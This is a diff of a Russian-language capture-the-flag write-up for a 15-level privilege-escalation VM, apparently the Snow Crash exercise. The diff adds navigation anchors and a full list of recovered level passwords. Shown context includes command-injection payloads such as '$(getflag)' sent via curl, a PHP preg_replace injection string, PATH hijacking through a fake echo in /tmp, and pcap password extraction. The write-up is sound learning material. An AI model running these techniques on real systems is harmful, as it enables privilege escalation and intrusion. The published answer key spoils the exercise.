@@ -1,3 +1,37 @@
+# Описание проекта.
+Проект по поиску уязвимостей безопасности.  \
+Есть образ, который необходимо запустить на виртуальной машине и получить пароли от пользователей                               \
+level00 level01 level02 level03 level04     \
+level05 level06 level07 level08 level09     \
+level10 level11 level12 level13 level14
+
+Скрипт для запуска образа в VirtualBox: `Vbox/setup.sh`.
+
+Полученные пароли записаныв файлы: levelXX/flag, \
+где XX - номер уровня, на котором получен пароль.
+
+Ниже последовательно описаны мои действия по достижению цели.
+
+# Содержание:
+
+[level00](#lvl00) \
+[level01](#lvl01) \
+[level02](#lvl02) \
+[level03](#lvl03) \
+[level04](#lvl04) \
+[level05](#lvl05) \
+[level06](#lvl06) \
+[level07](#lvl07) \
+[level08](#lvl08) \
+[level09](#lvl09) \
+[level10](#lvl10) \
+[level11](#lvl11) \
+[level12](#lvl12) \
+[level13](#lvl13) \
+[level14](#lvl14) 
+
+
+<a name="lvl00"></a> 
 # level00
 
 1. Проверяю содержимое директории:
@@ -39,12 +73,14 @@ Rechercher un outil ввести содержимое файла \
 su flag00 nottoohardhere
 
 getflag
+#  |
+# \/
 # Check flag.Here is your token : x24ti5gi3x0ol2eh4esiuxias
 
 # перехожу ко 01му уровню
 su level01 x24ti5gi3x0ol2eh4esiuxias
 ```
-
+<a name="lvl01"></a> 
 # level01
 
 1. Проверяю содержимое директории:
@@ -112,13 +148,15 @@ su flag01
 # Don't forget to launch getflag !
 
 getflag
+#  |
+# \/
 # Check flag.Here is your token : f2av5il02puano7naaf6adaaf
 ```
 
 ```
 su level02 f2av5il02puano7naaf6adaaf
 ```
-
+<a name="lvl02"></a> 
 # level02
 
 1. Проверяю содержимое директории:
@@ -151,13 +189,13 @@ tcpdump -r ~/level02.pcap -Xq | nl
 ```
  tcpdump -r не покажет тело пакета - только заголовки \
  -xq покажет тело пакета \
- -X  попытается как ascii расшифровать тело пакета \
- -n   ip   не конвертировать в доменное имя 
+ -X  попытается как ascii расшифровать тело пакета \
+ -n  ip не конвертировать в доменное имя 
 
 о tcp пакетах \
 https://networkguru.ru/protokol-transportnogo-urovnia-tcp-chto-nuzhno-znat/ \
-|| \
-\\/ \
+`||` \
+`\/` \
 пакеты с флагами PSH не буферизуются, а сразу в приложение идут. Нам нужны именно они. \
  см. по ссылке картинку Заголовок TCP. В ней отсчитываю: \
  source port - 0 и 1 байт, \
@@ -170,6 +208,8 @@ tcp[13] & 8 != 0 проверяет, установлен ли этот флаг
 and src 59.233.235.218 фильтрую пакеты по отправителю (отправитель вводит пароль)
 ```sh
 tcpdump -r ~/level02.pcap -n -Xq | nl | grep assword
+#  |
+# \/
 # reading from file /home/user/level02/level02.pcap, link-type EN10MB (Ethernet)
 #  234          0x0030:  011b b987 000d 0a50 6173 7377 6f72 643a  .......Password:
 ```
@@ -192,12 +232,12 @@ tcpdump -r ~/level02.pcap -n -xq -tttt                      \
     'tcp[13] & 8 != 0 and src 59.233.235.218' 2>/dev/null | \
     grep -A 10000 "06:23:34" |                              \
     grep "0x0030" |                                         \
-    cut -d' ' -f5 >                                         \
-    ./decoder
+    cut -d' ' -f5 
 ```
-получаю символ в 16ричной системе \
-перевожу в ascii. Для этого можно либо онлайн, либо свой декодер использовать (онлайн может не удалять символы при 7f встрече)
-https://www.dcode.fr/ascii-code
+получаю символ в 16ричной системе   \
+перевожу в ascii.                   \
+Для этого можно либо онлайн, либо свой декодер использовать (онлайн может не удалять символы при 7f встрече)                      \
+https://www.dcode.fr/ascii-code      \
  получаю:
 66 74 5f 77 61 6e 64 72 7f 7f 7f 4e 44 52 65 6c 7f 4c 30 4c 0d \
 HEX /2: ft_wandrNDRelL0L
@@ -207,11 +247,14 @@ HEX /2: ft_wandrNDRelL0L
 su flag02 с этим паролем ft_waNDReL0L
 ```sh
 getflag
+#  |
+# \/
 # Check flag.Here is your token : x24ti5gi3x0ol2eh4esiuxias
 # перехожу ко 3му уровню
 su level03 kooda2puivaav1idi4f57q8iq
 ```
 
+<a name="lvl03"></a> 
 # level03
 1. Проверяю содержимое директории:
 ```sh
@@ -233,7 +276,7 @@ system("/usr/bin/env echo Exploit me")
 
 создаю свой echo, меняю PATH на путь к себе в начале, запускаю level03:
 ```sh
-ls -la / \
+ls -la / 
 # нахожу место допустимое для записи 
 #  |
 # \/
@@ -248,26 +291,26 @@ chmod 777 /tmp/echo
 
 ```sh
 #!/bin/bash
-
 # my echo:
 
 getflag
 ```
-меняю PATH на путь к себе в начале
+меняю начало переменной PATH на путь к нужной мне папке - с моим скриптом echo:
 ```sh
 export PATH=/tmp:$PATH
 ```
-запускаю снова 
+запускаю снова:
 ```sh
 ./level03
 #  |
-#  \/
+# \/
 # Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
 
-# перехожу ко 4му уровню
+# перехожу к 4му уровню
 su level04 qi0maab88jeaj46qoumi7maus
 ```
 
+<a name="lvl04"></a> 
 # level04
 1. Проверяю содержимое директории:
 ```sh
@@ -301,10 +344,11 @@ curl localhost:4747?x='$(getflag)'
 # \/
 # Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
 
-# перехожу ко 5му уровню
+# перехожу к 5му уровню
 su level05 ne2searoevaevoem4ov4ar8ap
 ```
 
+<a name="lvl05"></a> 
 # level05
 
 1. В терминале при переходе на уровень появляется сообщение, что пришло письмо (иногда не появляется). \
@@ -317,8 +361,8 @@ cat /var/mail/level05
 ```
 */2 * * * * синтаксис линукс планировщика. Для расшифровки:
 https://crontab.guru/ \
-|| \
-\\/ \
+`||` \
+`\/` \
 “At every 2nd minute.”
 значит запускается скрипт с правами flag05
 ```sh
@@ -344,6 +388,7 @@ cat /opt/openarenaserver/psswflag
 su level06 viuaaale9huek52boumoomioc
 ```
 
+<a name="lvl06"></a> 
 # level06
 
 1. Проверяю содержимое директории:
@@ -426,6 +471,7 @@ echo '[x {${system(getflag)}}]' > /tmp/myy
 su level07 wiok45aaoguiboiki2tuin6ub
 ```
 
+<a name="lvl07"></a> 
 # level07
 
 1. Проверяю содержимое директории:
@@ -465,6 +511,7 @@ export LOGNAME='$(getflag)'
 su level08 fiumuikeil55xe9cu4dood66h
 ```
 
+<a name="lvl08"></a> 
 # level08
 
 Проверяю содержимое директории:
@@ -565,6 +612,7 @@ ln -s token /run/shm/tkn
 ./level08 /run/shm/tkn
 ```
 
+<a name="lvl09"></a> 
 # level09
 
 1. Проверяю содержимое директории:
@@ -627,6 +675,7 @@ getflag
 su level10 s5cAJpM8ev6XHw998pRWG728z
 ```
 
+<a name="lvl10"></a> 
 # level10
 
 1. Смотрю, что есть:
@@ -737,6 +786,8 @@ getflag
 su level11
 Password: feulo4b72j7edeahuete3no7c
 ```
+
+<a name="lvl11"></a> 
 # level11
 
 1. Смотрю, что есть
@@ -830,6 +881,7 @@ cat tkn
 su level12 fa6v5ateaw21peobuub8ipe6s
 ```
 
+<a name="lvl12"></a> 
 # level12
 
 1. Смотрю:
@@ -953,6 +1005,8 @@ cat /tmp/tkn2
 su level13
 Password: g1qKMiRpXf53AWhDaU7FEkczr
 ```
+
+<a name="lvl13"></a> 
 # level13
 
 1. Проверяю директорию и ее содержимое
@@ -1087,6 +1141,7 @@ c
 su level14 2A31L79asukciNyi8uppkEuSx
 ```
 
+<a name="lvl14"></a> 
 # level14
 
 1. Проверяю содержимое директории:
@@ -1162,3 +1217,21 @@ getflag
 # \/
 # Check flag.Here is your token : 7QiHafiNa3HVozsaXkawuYrTstxbpABHD8CPnHJ
 ```
+
+# список полученных паролей
+
+[level00](#lvl00) x24ti5gi3x0ol2eh4esiuxias \
+[level01](#lvl01) f2av5il02puano7naaf6adaaf \
+[level02](#lvl02) kooda2puivaav1idi4f57q8iq \
+[level03](#lvl03) qi0maab88jeaj46qoumi7maus \
+[level04](#lvl04) ne2searoevaevoem4ov4ar8ap \
+[level05](#lvl05) viuaaale9huek52boumoomioc \
+[level06](#lvl06) wiok45aaoguiboiki2tuin6ub \
+[level07](#lvl07) fiumuikeil55xe9cu4dood66h \
+[level08](#lvl08) 25749xKZ8L7DkSCwJkT9dyv6f \
+[level09](#lvl09) s5cAJpM8ev6XHw998pRWG728z \
+[level10](#lvl10) feulo4b72j7edeahuete3no7c \
+[level11](#lvl11) fa6v5ateaw21peobuub8ipe6s \
+[level12](#lvl12) g1qKMiRpXf53AWhDaU7FEkczr \
+[level13](#lvl13) 2A31L79asukciNyi8uppkEuSx \
+[level14](#lvl14) 7QiHafiNa3HVozsaXkawuYrTstxbpABHD8CPnHJ 
